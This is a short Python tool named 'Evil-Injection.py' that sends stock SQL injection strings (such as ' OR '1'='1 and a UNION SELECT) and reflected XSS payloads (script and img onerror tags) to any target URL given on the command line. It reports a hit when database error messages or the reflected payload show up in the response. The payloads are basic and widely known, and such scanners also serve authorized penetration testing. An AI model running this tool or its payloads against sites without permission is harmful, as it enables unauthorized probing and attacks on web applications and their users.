import requests
import threading
import argparse
from colorama import Fore, Style, init

init(autoreset=True)

payloads = {
    "SQLi": ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "'; --", "' UNION SELECT 1,2,3 --"],
    "XSS": ["<script>alert('XSS')</script>", "'><img src=x onerror=alert('XSS')>"]
}

sqli_errors = [
    "SQL syntax", "SQLite3::query():", "MySQL server", "syntax error", "Unclosed quotation mark",
    "near 'SELECT'", "Unknown column", "Warning: mysql_fetch", "Fatal error"
]

def banner():
    print(Fore.RED + Style.BRIGHT + r"""
   ______          _ _       _____           _   _             
  |  ____|        | (_)     |_   _|         | | (_)            
  | |__ ___  _ __ | |_  ___   | |  _ __  ___| |_ _  ___  _ __  
  |  __/ _ \| '_ \| | |/ __|  | | | '_ \/ __| __| |/ _ \| '_ \ 
  | | | (_) | | | | | | (__  _| |_| | | \__ \ |_| | (_) | | | |
  |_|  \___/|_| |_|_|_|\___||_____|_| |_|___/\__|_|\___/|_| |_|

                                 
        💉 Evil-Injection.py - Scanner CLI
           
                                                       By Evil_rider19    """)

def scan_payload(url, vuln_type, payload, verbose=False):
    try:
        response = requests.get(url, params={"name": payload}, timeout=5)
        content = response.text.lower()

        if vuln_type == "SQLi" and any(error.lower() in content for error in sqli_errors):
            print(Fore.GREEN + f"[+] SQLi found with payload: {Fore.YELLOW}{payload}")

        elif vuln_type == "XSS" and payload.lower() in content:
            print(Fore.MAGENTA + f"[+] XSS found with payload: {Fore.YELLOW}{payload}")

        elif verbose:
            print(Fore.RED + f"[-] Tested ({vuln_type}): {payload}")

    except requests.RequestException as e:
        print(Fore.RED + f"[!] Error with payload: {payload} -> {e}")

def main():
    parser = argparse.ArgumentParser(description="Evil-Injection - Basic SQLi/XSS scanner")
    parser.add_argument("--url", required=True, help="Target URL (e.g. http://site.com/page.php)")
    parser.add_argument("--type", choices=["SQLi", "XSS", "all"], default="all", help="Type of test to run")
    parser.add_argument("--verbose", action="store_true", help="Show all tested payloads")

    args = parser.parse_args()
    banner()

    print(Fore.CYAN + f"[*] Target: {args.url}")
    print(f"[*] Type: {args.type}\n")

    selected = payloads if args.type == "all" else {args.type: payloads[args.type]}

    threads = []
    for vuln, tests in selected.items():
        for payload in tests:
            t = threading.Thread(target=scan_payload, args=(args.url, vuln, payload, args.verbose))
            threads.append(t)
            t.start()

    for t in threads:
        t.join()

    print(Fore.CYAN + "\n[+] Scan completed.")

if __name__ == "__main__":
    main()
